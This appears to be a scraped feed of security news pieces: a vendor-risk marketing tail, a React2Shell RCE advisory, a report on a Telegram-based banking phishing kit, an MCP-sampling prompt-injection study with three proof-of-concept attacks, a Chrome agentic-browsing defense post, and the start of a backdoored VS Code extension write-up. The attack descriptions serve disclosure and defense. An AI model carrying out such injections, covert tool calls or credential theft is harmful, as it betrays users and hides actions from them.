troubles—nor should it, in a traditional model, since those are outside the classic IT security scope. As a result, organizations were caught off-guard by SVB’s collapse. A vendor that looked perfectly green from a security control standpoint turned out to be a huge business continuity threat. This kind of event exposes an “edge case” risk that isn’t an edge case at all: vendors can introduce strategic and financial risks that security teams and vendor managers often aren’t tracking.The Intelligence-Led Solution: Truly comprehensive third-party risk management means monitoring all-source intelligence on your vendors, not just cyber indicators. Recorded Future’s Third-Party Intelligence platform is built to ingest and analyze a broad spectrum of data about companies. This includes real-time monitoring of global news media, credit ratings and financial filings, changes in executive leadership, legal filings, sanctions lists, regulatory watchlists, and more. By defining “risk” holistically, the platform can alert you to significant non-cyber events that may impact your vendors. These signals give your security, risk, and procurement teams time to react, whether that means activating contingency plans, finding alternate suppliers, or engaging leadership to address the issue.The Solution: Move from “Trust” to “Continuous Verification”The five examples share a theme: “trust” is not a control. Vendor attestations and annual audits don’t capture rapidly changing third-party conditions—exploits, credentials, dependencies, and financial shocks. To answer why third-party risk management is important: it’s no longer a “vendor” problem. It’s your attack surface, your data, and your reputation on the line.Moving to continuous verification means supplementing or replacing periodic vendor check-ins with real-time intelligence and automation. This is where Recorded Future’s approach comes in. Recorded Future acts as a “risk radar” that’s always on, giving you a 360-degree, real-time view of your third-party ecosystem. It uniquely integrates multiple intelligence streams—threat intelligence, attack surface intelligence, and third-party risk intelligence—into one platform.Operationalize all of this via integrations to SIEM/SOAR/EDR and GRC/TPRM workflows (e.g., ServiceNow) so that risk evidence triggers action.Recorded Future is the only platform connecting disparate, live third-party intelligence into a single, real-time view that answers the question:“Which of my vendors poses the greatest risk to my business—right now?”Ready to replace point-in-time vendor questionnaires with continuous verification? Schedule a personalized demo, and our experts will show you how the Recorded Future platform provides a complete, real-time picture of your vendor ecosystem.What is the first step in creating a third-party risk management (TPRM) program?The first step is inventory and categorization. You can't protect what you don't know you have. This involves creating a comprehensive inventory of all your third-party vendors, suppliers, and partners and then categorizing them based on their access to sensitive data and their criticality to your operations (e.g., "high," "medium," "low" risk).What is the difference between third-party and fourth-party risk?Third-party risk is the risk posed by your direct vendors (e.g., your SaaS provider, your payroll company). Fourth-party risk (or Nth-party risk) is the risk posed by your vendor's vendors. For example, if your SaaS provider hosts its application on a major cloud platform, that cloud platform is your fourth-party. The risk is cascaded up the supply chain and is often invisible to you without the right intelligence.How often should we assess our third-party vendors?High-risk vendors (those with access to critical data or vital to operations) should be assessed at least annually and continuously monitored in real-time. Traditional, "point-in-time" assessments (like questionnaires) are no longer sufficient, as a vendor's security posture can change overnight.How does Recorded Future help manage third-party risk more effectively?Recorded Future's Third-Party Intelligence solution moves organizations beyond static, periodic assessments. It provides continuous, real-time intelligence by monitoring all your vendors for critical risk signals—like data breaches, malware infections, exposed credentials, attack surface vulnerabilities, and negative financial news—allowing you to prioritize and act on the most critical vendor risks before they become a breach.How can I see risks from my vendors that are part of my own attack surface?This is a critical connection.

The CVEs affect the same scenarios as React2Shell, however they cannot be exploited for remote code execution.The CVEs affect both React and Next.js, and new fix versions have been published in order to address them.A remote attacker could craft a malicious HTTP request to any React Server Function endpoint that, when deserialized by React, achieves arbitrary code execution on the server. The exploitation success rate is reported to be nearly 100% in default configurations.While initially no proof of concept exploits for the vulnerability was available, On December 4th a “non-official” full remote code execution exploit & technical analysis has been made public. The next day, the researcher’s original PoC was also made available –  This makes the vulnerability extremely likely to be exploited by external attackers.React servers that use React Server Function endpoints are known to be vulnerable. It is possible to check React Server applications for this vulnerable functionality by looking for the use server; directive in any of the application’s source code files, which signifies a Server Function is defined.async function requestUsername(formData) {
  'use server';
  const username = formData.get('username');
  // ...
}

export default function App() {
  return (
    <form action={requestUsername}>
      <input type="text" name="username" />
      <button type="submit">Request</button>
    </form>
  );
}React servers that support React Server ComponentsReact’s advisory states “Even if your app does not implement any React Server Function endpoints it may still be vulnerable if your app supports React Server Components.”.It is currently unclear what are the exact conditions that allow exploitation of CVE-2025-55182 when React Server Function endpoints are not used, but React Server Components are supported.If your application supports React Server Components in any way, we highly recommend upgrading the vulnerable components to one of the fixed versions (see table below).The most likely exploitation vector would be through Next.js web applications (CVE-2025-66478), since these are vulnerable in their default configuration. For example, creating a Next.js app with the standard create-next-app command and using the recommended values creates a vulnerable application, since these values enable the Next.js App Router, which gives access to the vulnerable React Server Function endpoints. These next.js applications will contain the app directory which means they are using the vulnerable App Router.How can I mitigate React2Shell?How can I track React2Shell?XRAY-900398 & XRAY-900476“The scanner sends a crafted multipart POST request that triggers a specific error condition in vulnerable versions of React Server Components. Vulnerable hosts return a 500 status code with  in the response body. This check differentiates vulnerable hosts from those that are simply running RSC.”What Makes React2Shell so Dangerous? Zero-Config Compromise: Attacking the Default StateThe flaw exists in the core deserialization logic of the React Flight Protocol itself. Next.js applications are vulnerable by default, since the vulnerable App Router is used in the default configuration. A standard project generated with “create-next-app” is immediately exposed, even if the developer hasn’t written a single line of custom code. This means the attack surface is enormous, covering a vast number of newly deployed and widely-used applications.An attacker does not need credentials, session tokens, or any user interaction to exploit the flaw. The malicious payload targets the React Flight protocol which is processed before the application’s custom authentication logic is executed. The attack only requires a single, specially crafted HTTP request sent to the public-facing server.Reliable Remote Code ExecutionThe exploit allows attackers to seize complete control over the compromised server’s process. Exploitability is near-100% against vulnerable systems, making the exploit a “set-it-and-forget-it” attack vector for threat actors. The existence of reliable, public PoC code accelerates the timeline for mass exploitation, as it significantly lowers the barrier of entry for less sophisticated attackers. Active scanning and exploitation attempts were detected in the wild within hours of the public disclosure.Enterprise Response PlaybookWhat are the steps enterprises (including those who are not JFrog customers) should take in the immediate, medium and long termHere are the key steps that we recommend Enterprise customers take:  Upgrade the vulnerable packages to fixed versions (see table above)  Next.js apps – If App-Router is not required, disable it and migrate the app  The attack can be detected by WAF rules – Add a WAF security solution]]></content:encoded></item><item><title>How phishers hide banking scams behind free Cloudflare Pages</title><link>https://www.malwarebytes.com/blog/news/2025/12/how-phishers-hide-banking-scams-behind-free-cloudflare-pages</link><author></author><category>threatintel</category><pubDate>Mon, 8 Dec 2025 15:26:29 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[During a recent investigation, we uncovered a phishing operation that combines free hosting on developer platforms with compromised legitimate websites to build convincing banking and insurance login portals. These fake pages don’t just grab a username and password–they also ask for answers to secret questions and other “backup” data that attackers can use to bypass multi-factor authentication and account recovery protections.Instead of sending stolen data to a traditional command-and-control server, the kit forwards every submission to a Telegram bot. That gives the attackers a live feed of fresh logins they can use right away. It also sidesteps many domain-based blocking strategies and makes swapping infrastructure very easy.​Phishing groups increasingly use services like Cloudflare Pages () to host their fake portals, sometimes copying a real login screen almost pixel for pixel. In this case, the actors spun up subdomains impersonating financial and healthcare providers. The first one we found was impersonating Heartland bank Arvest.To be clear, these companies have not been compromised and accessing their websites from trusted domains remains safe. What is instead happening is that these companies are having their online likenesses faked as a way to fool victims in a longer attack chain that often starts with a phishing email.On closer look, the phishing site shows visitors two “failed login” screens, prompts for security questions, and then sends all credentials and answers to a Telegram bot.Comparing their infrastructure with other sites, we found one impersonating a much more widely known brand: United Healthcare.In this case, the phishers abused a compromised website as a redirector. Attackers took over a legitimate-looking domain like biancalentinidesigns[.]com and saddle it with long, obscure paths for phishing or redirection. Emails link to the real domain first, which then forwards the victim to the active Cloudflare pages phishing site. Messages containing a familiar or benign-looking domain are more likely to slip past spam filters than links that go straight to an obviously new cloud-hosted subdomain.​Cloud-based hosting also makes takedowns harder. If one  hostname gets reported and removed, attackers can quickly deploy the same kit under another random subdomain and resume operations.​The phishing kit at the heart of this campaign follows a multi-step pattern designed to look like a normal sign-in flow while extracting as much sensitive data as possible.​Instead of using a regular form submission to a visible backend, JavaScript harvests the fields and bundles them into a message sent straight to the Telegram API.. That message can include the victim’s IP address, user agent, and all captured fields, giving criminals a tidy snapshot they can use to bypass defenses or sign in from a similar environment.​The exfiltration mechanism is one of the most worrying parts. Rather than pushing credentials to a single hosted panel, the kit posts them into one or more Telegram chats using bot tokens and chat IDs hardcoded in the JavaScript. As soon as a victim submits a form, the operator receives a message in their Telegram client with the details, ready for immediate use or resale.​This approach offers several advantages for the attackers: they can change bots and chat IDs frequently, they do not need to maintain their own server, and many security controls pay less attention to traffic that looks like a normal connection to a well-known messaging platform. Cycling multiple bots and chats gives them redundancy if one token is reported and revoked.​What an attack might look likePutting all the pieces together, a victim’s experience in this kind of campaign often looks like this:​They receive a phishing email about banking or health benefits: “Your online banking access is restricted,” or “Urgent: United Health benefits update.”The link points to a legitimate but compromised site, using a long or strange path that does not raise instant suspicion.​That hacked site redirects, silently or after a brief delay, to a *.pages.dev phishing site that looks almost identical to the impersonated brand.​After entering their username and password, the victim sees an error or extra verification step and is asked to provide answers to secret questions or more personal and financial information.​Behind the scenes, each submitted field is captured in JavaScript and sent to a Telegram bot, where the attacker can use or sell it immediately.​From the victim’s point of view, nothing seems unusual beyond an odd-looking link and a failed sign-in. For the attackers, the mix of free hosting, compromised redirectors, and Telegram-based exfiltration gives them speed, scale, and resilience.The bigger trend behind this campaign is clear: by leaning on free web hosting and mainstream messaging platforms, phishing actors avoid many of the choke points defenders used to rely on, like single malicious IPs or obviously shady domains. Spinning up new infrastructure is cheap, fast, and largely invisible to victims.Education and a healthy dose of skepticism are key components to staying safe. A few habits can help you avoid these portals:​Always check the full domain name, not just the logo or page design. Banks and health insurers don’t host sign-in pages on generic developer domains like , , or on strange paths on unrelated sites.​Don’t click sign-in or benefits links in unsolicited emails or texts. Instead, go to the institution’s site via a bookmark or by typing the address yourself.​Treat surprise “extra security” prompts after a failed login with caution, especially if they ask for answers to security questions, card numbers, or email passwords.​If anything about the link, timing, or requested information feels wrong, stop and contact the provider using trusted contact information from their official site.Malwarebytes free Browser Guard extension blocked these websites.We don’t just report on threats—we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline.

MCP is a standard for connecting large language model (LLM) applications to external data sources and tools.We show that, without proper safeguards, malicious MCP servers can exploit the sampling feature for a range of attacks. We demonstrate these risks in practice through three proof-of-concept (PoC) examples conducted within the coding copilot, and discuss strategies for effective prevention.We performed all experiments and PoC attacks described here on a copilot that integrates MCP for code assistance and tool access. Because this risk could exist on other copilots that enable the sampling feature we’ve not mentioned the specific vendor or name of the copilot to maintain impartiality. MCP sampling relies on an implicit trust model and lacks robust, built-in security controls. This design enables new potential attack vectors in agents that leverage MCP. We have identified three critical attack vectors: Attackers can abuse MCP sampling to drain AI compute quotas and consume resources for unauthorized or external workloads. Compromised or malicious MCP servers can inject persistent instructions, manipulate AI responses, exfiltrate sensitive data or undermine the integrity of user interactions. The protocol allows hidden tool invocations and file system operations, enabling attackers to perform unauthorized actions without user awareness or consent.Given these risks, we also examine and evaluate mitigation strategies to strengthen the security and resilience of MCP-based systems.Palo Alto Networks offers products and services that can help organizations protect AI systems:MCP is an open-standard, open-source framework introduced by Anthropic in November 2024 to standardize the way LLMs integrate and share data with external tools, systems and data sources. Its key purpose is providing a unified interface for the communication between the application and external services.MCP revolves around three key components:The MCP host (the application itself)The MCP client (that manages communication)The MCP server (that provides tools and resources to extend the LLM's capabilities)MCP defines several primitives (core communication protocols) to facilitate integration between MCP clients and servers. In the typical interaction flow, the process follows a client-driven pattern:The user sends a request to the MCP clientThe client forwards relevant context to the LLMThe LLM generates a response (potentially including tool calls)The client then invokes the appropriate MCP server tools to execute those operationsThroughout this flow, the client maintains centralized control over when and how the LLM is invoked.One relatively new and powerful primitive is MCP sampling, which fundamentally reverses this interaction pattern. With sampling, MCP servers can proactively request LLM completions by sending sampling requests back to the client.When a server needs LLM capabilities (for example, to analyze data or make decisions), it initiates a sampling request to the client. The client then invokes the LLM with the server's prompt, receives the completion and returns the result to the server.This bidirectional capability allows servers to leverage LLM intelligence for complex tasks while clients retain full control over model selection, hosting, privacy and cost management. According to the official documentation, sampling is specifically designed to enable advanced agentic behaviors without compromising security and privacy.MCP Architecture and ExamplesMCP employs a client-server architecture that enables host applications to connect with multiple MCP servers simultaneously. The system comprises three key components:: Programs like Claude Desktop that want to access external data or tools: Components that live within the host application and manage connections to MCP servers: External programs that expose tools, resources and prompts via a standard API to the AI modelWhen a user interacts with an AI application that supports MCP, a sequence of background processes enables smooth communication between the AI and external systems. Figure 1 shows the overall communication process for AI applications built with MCP.Phase 1: Protocol HandshakeMCP handshakes consist of the following phases:The MCP client initiates a connection with the configured MCP servers running on the local device.The client queries each server to determine what capabilities it offers. Each server then responds with a list of available tools, resources and prompts.The client registers the discovered capabilities. These capabilities are now accessible to the AI and can be invoked during user interactions.Once MCP communications have begun, they progress through the following stages:Prompt analysis and tool selection: The LLM analyzes the user’s prompt and recognizes that it needs external tool access. It then identifies the corresponding MCP capability to complete the request.: The client displays a permission prompt asking the user to grant the necessary privileges to access the external tool or resource.: After obtaining the privileges, the client sends a request to the appropriate MCP server using the standardized protocol format (JSON-RPC).The MCP server processes the request, executes the tool with the necessary parameters and returns the result to the client.: After the LLM finishes its tool execution, it returns information to the MCP client, which in turn processes it and displays it to the user.In this section, we dive further into the MCP server features and understand the role and capability of the MCP sampling feature. To date, the MCP server exposes three primary primitives: These are data sources accessible to LLMs, similar to GET endpoints in a REST API. For example, a file server might expose  to provide README content, or a database server could share table schemas. These are predefined prompt templates designed to guide complex tasks. They provide the AI with optimized prompt patterns for specific use cases, helping streamline and standardize interactions. These are functions that the MCP host can invoke through the server, analogous to POST endpoints. Official MCP servers exist for many popular tools.MCP Sampling: An Underused FeatureTypically, MCP-based agents follow a simple pattern. Users type prompts and the LLM calls the appropriate server tools to get answers. But what if servers could ask the LLM for help too? That's exactly what the sampling feature enables.Sampling gives MCP servers the ability to process information more intelligently using an LLM. When a server needs to summarize a document or analyze data, it can request help from a client's language model instead of doing all the work itself.Here’s a simple example: Imagine an MCP server with a  tool. Here's how it works differently with and without sampling.The server reads your fileThe server employs a local summarization algorithm on its end to process the textThe server reads your fileThe server asks your LLM, “please summarize this document in three key points”Your LLM generates the summaryThe server returns the polished summary to youEssentially, the server leverages the user's LLM to provide intelligent features without needing its own AI infrastructure. It's like giving the server permission to use an AI assistant when needed. This transforms simple tools into intelligent agents that can analyze, summarize and process information.This all happens while keeping users in control of the AI interaction. Figure 2 shows the high-level workflow of the MCP sampling feature.To use the sampling feature, the MCP server sends a  request to the MCP client. The method accepts a JSON-formatted request with the following structure. The client then reviews the request and can modify it.After reviewing the request, the client “samples” from an LLM and then reviews the completion. As the last step, the client returns the result to the server. The following is an example of the sampling request.There are two primary fields that define the request behavior:: An array of message objects that represents the complete conversation history. Each message object contains the following, which provides the context and query for the LLM to process:
The role identifier (user, assistant, etc.)The content structure with type and text fields: A directive that provides specific behavioral guidance to the LLM for this request. In this case, it instructs the model to act as a “security-focused code reviewer,” which:
Defines the perspective and expertise of the responseEnsures the analysis focuses on security considerationsEnsures a consistent reviewing approachOther fields’ definitions can be found on Anthropic’s official page.MCP Sampling Attack Surface AnalysisMCP sampling introduces potential attack opportunities, with prompt injection being the primary attack vector. The protocol's design allows MCP servers to craft prompts and request completions from the client's LLM. Since servers control both the prompt content and how they process the LLM's responses, they can inject hidden instructions, manipulate outputs, and potentially influence subsequent tool executions.We assume the MCP client, host application (e.g., Claude Desktop) and underlying LLM operate correctly and remain uncompromised. MCP servers, however, are untrusted and represent the primary attack vector, as they may be malicious from installation or compromised later via supply chain attacks or exploitation.Our threat model focuses on attacks exploiting the MCP sampling feature, in which servers request LLM completions through the client. We exclude protocol implementation vulnerabilities such as buffer overflows or cryptographic flaws, client-side infrastructure attacks and social engineering tactics to install malicious servers. Instead, we concentrate on technical exploits available once a malicious server is connected to the system.Experiment Setup and Malicious MCP ServerTo demonstrate these potential risks, we developed a malicious code summarizer MCP server, based on Anthropic’s everything MCP server. This is a demo server that aims to exercise all the features of the MCP protocol, including the MCP sampling feature.The malicious MCP server provides legitimate functionality while performing covert operations. Specifically, it provides a tool named , making it indistinguishable from benign tools during selection. When users request code summarization tasks, the MCP protocol automatically routes the request to this tool, as shown in Figure 3.When users request code summarization tasks, the MCP protocol identifies these requests and automatically routes them to the tool for help. Figure 3 above shows the detailed parameters and guideline prompts used by this tool.For the MCP host/client, we choose a code editor that supports the MCP sampling feature. Figure 4 shows the typical interaction process.The summary task we provided to the copilot summarizes the main source file of the everything MCP server.PoC 1: Resource Theft: Excessive Token ConsumptionThrough Hidden PromptsThis attack shows how the malicious server can exploit LLM completions to steal a user’s token quota by appending hidden requests to prompts. The malicious tool adds hidden instructions at the end of the main prompt:This hidden instruction causes the LLM to generate a fictional story along with the requested code summary. When the user submits a summarization request (as shown in Figure 3 above), the server processes it as usual but secretly instructs the LLM to produce additional content. The LLM’s response includes both the code summary and the hidden story.In our experiments with the copilot, the host only displayed the code summary (shown in Figure 5).However, the LLM still processes and generates the full response, including any hidden content injected by the server. This additional content, though invisible to users, continues to consume computational resources and appears in server logs.The disconnect between what users see and what actually gets processed creates a perfect cover for resource exhaustion attacks. Users receive their expected summary with no indication that the LLM also generated extensive hidden content in the background.Despite the successful exploitation, we note that we observed this behavior specifically in our testing with the target MCP client’s implementation. Different MCP hosts may handle output filtering and display differently.Some implementations might show full LLM responses, provide warnings about hidden content or have other safeguards in place. What makes this particular implementation vulnerable is its approach to presenting results.The MCP client performs an additional layer of summarization on the MCP tool output before displaying it to the user. It condenses the content into a brief summary, rather than showing the raw LLM response.This design choice increases the attack's effectiveness, as the hidden content becomes effectively invisible in the chat interface. Only by expanding and examining the raw server console output, an action most users would have no reason to take, would the exploitation become apparent.This potential attack vector reflects the specific design choices of the tested implementation and may not be universally applicable to all MCP hosts supporting the sampling feature.Figures 6 and 7 reveal the fictional story in the server console output, confirming successful token theft. To the user, everything appears normal. They receive the summary as expected. In reality, the malicious server has consumed extra computational resources equivalent to generating 1,000 additional words, all billed to the user’s API credits. This attack enables resource theft, unauthorized content generation and potential data exfiltration through carefully crafted hidden prompts.PoC 2: Conversation Hijacking: Persistent Prompt InjectionThe second attack demonstrates how the malicious MCP server can inject instructions that persist across multiple conversation turns, effectively compromising the entire conversation. The server instructs the LLM to append specific instructions in its response and causes the following conversation to follow these instructions:=+ Starting with the same code summarization request, the malicious server appends the injection instruction to the user’s prompt. Following this malicious prompt, the LLM then includes this text in its response (shown in Figure 8), which becomes part of the conversation context. Once injected, these instructions affect all subsequent interactions.When the user asks follow-up questions, the AI assistant responds in pirate speak (as shown in Figure 9), demonstrating that the injection has taken a persistent effect. This attack can fundamentally alter the AI assistant's behavior, potentially making it less useful or even dangerous if more sophisticated instructions are injected. Unlike one-time token theft, this creates a lasting compromise that affects the entire session.PoC 3: Covert Tool InvocationThis attack leverages prompt injection to trigger unauthorized tool invocations, enabling a malicious server to perform hidden actions on the user's system. The server modifies the user’s prompt to embed instructions that cause the LLM to invoke additional tools without the user’s awareness:=+In this example, the LLM is assumed to have access to a tool called , which allows it to write content to local files. The malicious server provides this tool, but it could also be supplied by other MCP servers on the system, such as the commonly used  MCP server.: When the user requests code summarization, the malicious summarizer tool appends hidden instructions to the LLM's prompt. This causes the LLM to not only generate the requested summary but also secretly invoke the  tool. The tool writes the complete response to a local file named . While the LLM's response acknowledges this file operation (as shown in Figure 10), it embeds the acknowledgment within the summary text, making it unlikely that users will notice the unauthorized action.The attack succeeds because the file operation appears as a legitimate tool invocation from the LLM's perspective. The user receives their expected code summary while remaining unaware that their system has been modified (as shown in Figure 11). This attack demonstrates the potential for malicious file operations, data exfiltration, persistence mechanisms and other unauthorized system modifications. This is all performed without explicit user consent.Detecting and Preventing Prompt Injection in MCP SamplingDetection focuses on identifying malicious patterns in both sampling requests and LLM responses.On the request side, systems should scan for injection markers like , , role-play attempts (“You are now”) and hidden content using common injection strategies such as zero-width characters or Base64 encoding.On the response side, detection involves monitoring for unexpected tool invocations, embedded meta-instructions ("For all future requests...") and outputs that attempt to modify client behavior. Statistical analysis provides another layer by flagging requests that exceed normal token usage patterns or exhibit an unusually high frequency of sampling requests. Responses should also be inspected for references to malicious domains or exploits that can compromise the agent.Prevention requires implementing multiple defensive layers before malicious prompts can cause harm. Request sanitization forms the first line of defense:Enforce strict templates that separate user content from server modificationsStrip suspicious patterns and control charactersImpose token limits based on operation typeResponse filtering acts as the second barrier by removing instruction-like phrases from LLM outputs and requiring explicit user approval for any tool execution.Access controls provide structural protection through capability declarations that limit what servers can request, context isolation that prevents access to conversation history, and rate limiting that caps sampling frequency.Palo Alto Networks offers products and services that can help organizations protect AI systems:North America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42)Europe and Middle East: +31.20.299.3130Australia: +61.2.4062.7950Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members.

While the alleged victim is really just going about their normal day, criminals show the family real Facebook photos to “prove” that person is still alive but in their custody.This attack resembles Facebook cloning but with a darker twist. Instead of just impersonating you to scam your friends, attackers weaponize your pictures to stage fake proof‑of‑life evidence.Both scams feed on oversharing. Public posts give criminals more than enough information to impersonate you, copy your life, and convince your loved ones something is wrong. This alert focuses on criminals scraping photos from social media (usually Facebook, but also LinkedIn, X, or any public profile) then manipulating those images with AI or simple editing to use during extortion attempts. If you know what to look for, you might spot inconsistencies like missing tattoos, unusual lighting, or proportions that don’t quite match.Scammers rely on panic. They push tight deadlines, threaten violence, and try to force split-second decisions. That emotional pressure is part of their playbook.In recent years, the FBI has also warned about synthetic media and deepfakes, like explicit images generated from benign photos and then used for sextortion, which is a closely related pattern of abuse of user‑posted pictures. Together, these warnings point to a trend: ordinary profile photos, holiday snaps, and professional headshots are increasingly weaponized for extortion rather than classic account hacking.To make it harder for criminals to use these tactics, be mindful of what information you share on social media. Share pictures of yourself, or your children, only with actual friends and not for the whole world to find. And when you’re travelling, post the beautiful pictures you have taken when you’re back, not while you’re away from home.Who can see your profile information.App and website permissions.If you’re on the receiving end of a virtual kidnapping attempt:Establish a code word only you and your loved ones know that you can use to prove it’s really you.Always attempt to contact the alleged victim before considering paying any ransom demand.Keep records of every communication with the scammers.

Chrome has been advancing the web’s security for well over 15 years, and we’re committed to meeting new challenges and opportunities with AI. Billions of people trust Chrome to keep them safe by default, and this is a responsibility we take seriously. Following the recent launch of Gemini in Chrome and the preview of agentic capabilities, we want to share our approach and some new innovations to improve the safety of agentic browsing. 

The primary new threat facing all agentic browsers is indirect prompt injection. It can appear in malicious sites, third-party content in iframes, or from user-generated content like user reviews, and can cause the agent to take unwanted actions such as initiating financial transactions or exfiltrating sensitive data. Given this open challenge, we are investing in a layered defense that includes both deterministic and probabilistic defenses to make it difficult and costly for attackers to cause harm. 

Designing safe agentic browsing for Chrome has involved deep collaboration of security experts across Google. We built on Gemini's existing protections and agent security principles and have implemented several new layers for Chrome.

We’re introducing a where the agent’s actions are vetted by a separate model that is isolated from untrusted content. We’re also extending Chrome’s origin-isolation capabilities to constrain what origins the agent can interact with, to just those that are relevant to the task. Our layered defense also includes  for critical steps, real-time detection of threats, and . We’ll step through these layers below.
Checking agent outputs with User Alignment Critic 
The main planning model for Gemini uses page content shared in Chrome to decide what action to take next. Exposure to untrusted web content means it is inherently vulnerable to indirect prompt injection. We use techniques like spotlighting that direct the model to strongly prefer following user and system instructions over what’s on the page, and we’ve upstreamed known attacks to train the Gemini model to avoid falling for them. 

To further bolster model alignment beyond spotlighting, we’re introducing the  — a separate model built with Gemini that acts as a high-trust system component. This architecture is inspired partially by the dual-LLM pattern as well as CaMeL research from Google DeepMind.
A flow chart that depicts the User Alignment Critic: a trusted component that vets each action before it reaches the browser.
The User Alignment Critic runs after the planning is complete to double-check each proposed action. Its primary focus is task alignment: determining whether the proposed action serves the user’s stated goal. If the action is misaligned, the Alignment Critic will veto it. This component is architected to see only metadata about the proposed action and not any unfiltered untrustworthy web content, thus ensuring it cannot be poisoned directly from the web. It has less context, but it also has a simpler job — just approve or reject an action.

This is a powerful, extra layer of defense against both goal-hijacking and data exfiltration within the action step. When an action is rejected, the Critic provides feedback to the planning model to re-formulate its plan, and the planner can return control to the user if there are repeated failures. 
Enforcing stronger securityaries with Origin Sets Site Isolation and the same-origin policy are fundamental boundaries in Chrome’s security model and we’re carrying forward these concepts into the agentic world. By their nature, agents must operate across websites (e.g. collecting ingredients on one site and filling a shopping cart on another). But if an unrestricted agent is compromised and can interact with arbitrary sites, it can create what is effectively a Site Isolation bypass. That can have a severe impact when the agent operates on a local browser like Chrome, with logged-in sites vulnerable to data exfiltration. To address this, we’re extending those principles with . Our design architecturally limits the agent to only access data from origins that are related to the task at hand, or data that the user has chosen to share with the agent. This prevents a compromised agent from acting arbitrarily on unrelated origins.

For each task on the web, a trustworthy  decides which origins proposed by the planner are relevant to the task. The design is to separate these into two sets, tracked for each session:
 are those from which Gemini is permitted to consume content. If an iframe’s origin isn’t on the list, the model will not see that content.are those on which the agent is allowed to actuate (e.g., click, type) in addition to reading from. 
This delineation enforces that only data from a limited set of origins is available to the agent, and this data can only be passed on to the writable origins. This bounds the threat vector of cross-origin data leaks. This also gives the browser the ability to enforce some of that separation, such as by not even sending to the model data that is outside the readable set. This reduces the model’s exposure to unnecessary cross-site data. Like the Alignment Critic, the gating functions that calculate these origin sets are not exposed to untrusted web content. The planner can also use context from pages the user explicitly shared in that session, but it cannot add new origins without the gating function’s approval. Outside of web origins, the planning model may ingest other non-web content such as from tool calls, so we also delineate those into read-vs-write calls and similarly check that those calls are appropriate for the task.
Iframes from origins that aren’t related to the user’s task are not shown to the model.
Page navigations can happen in several ways: If the planner decides to navigate to a new origin that isn’t yet in the readable set, that origin is checked for relevancy by a variant of the User Alignment critic before Chrome adds it and starts the navigation. And since model-generated URLs could exfiltrate private information, we have a deterministic check to restrict them to known, public URLs. If a page in Chrome navigates on its own to a new origin, it’ll get vetted by the same critic.

Getting the balance right on the first iteration is hard without seeing how users’ tasks interact with these guardrails. We’ve initially implemented a simpler version of origin gating that just tracks the read-writeable set. We will tune the gating functions and other aspects of this system to reduce unnecessary friction while improving security. We think this architecture will provide a powerful security primitive that can be audited and reasoned about within the client, as it provides guardrails against cross-origin sensitive data exfiltration and unwanted actions.
Transparency and control for sensitive actions
We designed the agentic capabilities in Chrome to give the user both transparency and control when they need it most. As the agent works in a tab, it details each step in a work log, allowing the user to observe the agent's actions as they happen. The user can pause to take over or stop a task at any time. 

This transparency is paired with several layers of deterministic and model-based checks to trigger user confirmations before the agent takes an impactful action. These serve as guardrails against both model mistakes and adversarial input by putting the user in the loop at key moments.

First, the agent will require a user confirmation before it navigates to certain sensitive sites, such as those dealing with banking transactions or personal medical information. This is based on a deterministic check against a list of sensitive sites. Second, it’ll confirm before allowing Chrome to sign-in to a site via Google Password Manager – the model does not have direct access to stored passwords. Lastly, before any sensitive web actions like completing a purchase or payment, sending messages, or other consequential actions, the agent will try to pause and either get permission from the user before proceeding or ask the user to complete the next step. Like our other safety classifiers, we’re constantly working to improve the accuracy to catch edge cases and grey areas.  
Illustrative example of when the agent gets to a payment page, it stops and asks the user to complete the final step.  Detecting “social engineering” of agents 
In addition to the structural defenses of alignment checks, origin gating, and confirmations, we have several processes to detect and respond to threats. While the agent is active, it checks every page it sees for indirect prompt injection. This is in addition to Chrome’s real-time scanning with Safe Browsing and on-device AI that detect more traditional scams. This prompt-injection classifier runs in parallel to the planning model’s inference, and will prevent actions from being taken based on content that the classifier determined has intentionally targeted the model to do something unaligned with the user’s goal. While it cannot flag everything that might influence the model with malicious intent, it is a valuable layer in our defense-in-depth.
Continuous auditing, monitoring, response 
To validate the security of this set of layered defenses, we’ve built automated red-teaming systems to generate malicious sandboxed sites that try to derail the agent in Chrome. We start with a set of diverse attacks crafted by security researchers, and expand on them using LLMs following a technique we adapted for browser agents. Our continuous testing prioritizes defenses against broad-reach vectors such as user-generated content on social media sites and content delivered via ads. We also prioritize attacks that could lead to lasting harm, such as financial transactions or the leaking of sensitive credentials. The attack success rate across these give immediate feedback to any engineering changes we make, so we can prevent regressions and target improvements. Chrome’s auto-update capabilities allow us to get fixes out to users very quickly, so we can stay ahead of attackers.
Collaborating across the community
We have a long-standing commitment to working with the broader security research community to advance security together, and this includes agentic safety. We’ve updated our Vulnerability Rewards Program (VRP) guidelines to clarify how external researchers can focus on agentic capabilities in Chrome. We want to hear about any serious vulnerabilities in this system, and will pay up to $20,000 for those that demonstrate breaches in the security boundaries. The full details are available in VRP rules.

The upcoming introduction of agentic capabilities in Chrome brings new demands for browser security, and we've approached this challenge with the same rigor that has defined Chrome's security model from its inception. By extending some core principles like origin-isolation and layered defenses, and introducing a trusted-model architecture, we're building a secure foundation for Gemini’s agentic experiences in Chrome. This is an evolving space, and while we're proud of the initial protections we've implemented, we recognize that security for web agents is still an emerging domain. We remain committed to continuous innovation and collaboration with the security community to ensure Chrome users can explore this new era of the web safely.

It’s installed on almost all developer machines globally. Developers have access to sensitive data and credentials to push code that ends up in production. A supply chain attack could lead to gaining access to developers’ machines, which in turn could provide entry to organizations’ systems.The results were eye-opening. It turns out that publishing a backdoor into developers’ machines via a VS Code extension is alarmingly easy.In this post, I’ll walk through my process of bypassing current Microsoft sandbox analysis, SAST scanning, DAST scanning, and all relevant security controls to push a VS Code extension that went undetected by Microsoft and security vendors.The research showcases several weaknesses in the security controls currently used by Microsoft. All the issues were reported to Microsoft, and Microsoft accepted the existing risk.The research showcases that there are no security checks at all being performed within OpenVSX, the market that is used by Cursor AI, Windsurf, AWS Kiro, and other IDEs. I also responsibly disclosed the research to Cursor AI Security and the Eclipse Foundation.Visual Studio Code is maintained by Microsoft, and it has a centralized extension marketplace run by Microsoft. When you publish an extension to the VS Code Marketplace, it supposedly undergoes quality and security checks.Crafting a Malicious “Piithon-linter” ExtensionTo make this experiment realistic, I needed to create a useful extension that could carry out malicious actions. I came up with Piithon-linter, pitched as a Python code linter/formatter with magical capabilities to automatically format code. The name is a deliberate misspelling (with  instead 